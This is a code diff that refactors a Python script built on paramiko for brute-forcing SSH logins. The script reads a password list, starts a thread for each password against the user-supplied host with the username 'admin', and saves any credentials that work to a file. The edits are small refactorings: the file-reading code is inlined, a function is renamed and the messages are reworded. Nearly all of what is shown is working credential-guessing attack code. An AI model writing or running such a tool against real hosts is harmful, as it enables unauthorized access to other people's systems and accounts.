@@ -6,7 +6,6 @@ import logging
 from logging import NullHandler
 from paramiko import SSHClient, AutoAddPolicy, AuthenticationException, ssh_exception
 
-
 # This function is responsible for the ssh client connecting.
 def ssh_connect(host, username, password):
     ssh_client = SSHClient()
@@ -22,15 +21,11 @@ def ssh_connect(host, username, password):
             fh.write(f"Username: {username}\nPassword: {password}\nWorked on host {host}\n")
             return True
     except AuthenticationException:
-        print(f"Username - {username} and Password - {password} is incorrect.")
+        print(f"Username - {username} and Password - {password} is Incorrect.")
         return False
     except ssh_exception.SSHException as e:
-        if "timed out" in str(e):
-            print(f"Connection to {host} timed out.")
-        else:
-            print(f"Failed to connect to {host}: {str(e)}")
+        print(f"**** Attempting to connect - {e} ****")
         return False
-
 
 # This function gets a valid IP address from the user.
 def get_ip_address():
@@ -45,26 +40,15 @@ def get_ip_address():
             # If host is not a valid IPv4 address we send the message that the user should enter a valid ip address.
             print("Please enter a valid ip address.")
 
-
-# This function reads passwords from a file.
-def read_passwords_file(filename):
-    passwords = []
-    with open(filename, "r") as f:
-        for line in f:
-            password = line.strip()
-            if password:
-                passwords.append(password)
-    return passwords
-
-
 # The program will start in the main function.
-def main():
+def __main__():
     logging.getLogger('paramiko.transport').addHandler(NullHandler())
     # To keep to functional programming standards we declare ssh_port inside a function.
     list_file = "passwords.txt"
     host = get_ip_address()
-    passwords = read_passwords_file(list_file)
-    # This function reads a csv file with passwords.
+    with open(list_file, "r") as fh:
+        passwords = fh.read().splitlines()
+    # This function reads a txt file with passwords.
     for password in passwords:
         # We create a thread on the ssh_connect function, and send the correct arguments to it.
         t = threading.Thread(target=ssh_connect, args=(host, 'admin', password,))
@@ -73,7 +57,6 @@ def main():
         # We leave a small time between starting a new connection thread.
         time.sleep(0.2)
 
-
 #  We run the main function where execution starts.
-if __name__ == "__main__":
-    main()
+if __name__ == '__main__':
+    __main__()
